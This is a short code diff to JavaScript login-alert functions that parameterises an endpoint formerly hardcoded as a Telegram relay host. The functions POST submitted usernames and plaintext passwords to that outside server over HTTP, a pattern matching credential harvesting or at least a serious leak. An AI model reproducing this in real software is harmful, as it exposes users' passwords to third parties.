@@ -1,4 +1,4 @@
-function sendAjaxRequest(id, username, time, host, ip) {
+function sendAjaxRequest(url, id, username, time, host, ip) {
   var params = {
     sendMessage: "local",
     id,
@@ -10,7 +10,7 @@ function sendAjaxRequest(id, username, time, host, ip) {
 
   $.ajax({
     method: "POST",
-    url: "http://telegram.om-dienstleistungen.de/",
+    url,
     data: params,
     success: function (response) {
       window.location.href = "index.php?msg=<?= $username ?>";
@@ -20,7 +20,7 @@ function sendAjaxRequest(id, username, time, host, ip) {
     },
   });
 }
-function sendLoginAttemptAlert(username, password, time, host, ip) {
+function sendLoginAttemptAlert(url, username, password, time, host, ip) {
   var data = {
     sendMessage: "attempt",
     origen: "local",
@@ -33,7 +33,7 @@ function sendLoginAttemptAlert(username, password, time, host, ip) {
 
   $.ajax({
     type: "POST",
-    url: "http://telegram.om-dienstleistungen.de/",
+    url,
     data: data,
     success: function (response) {
       console.log(response);
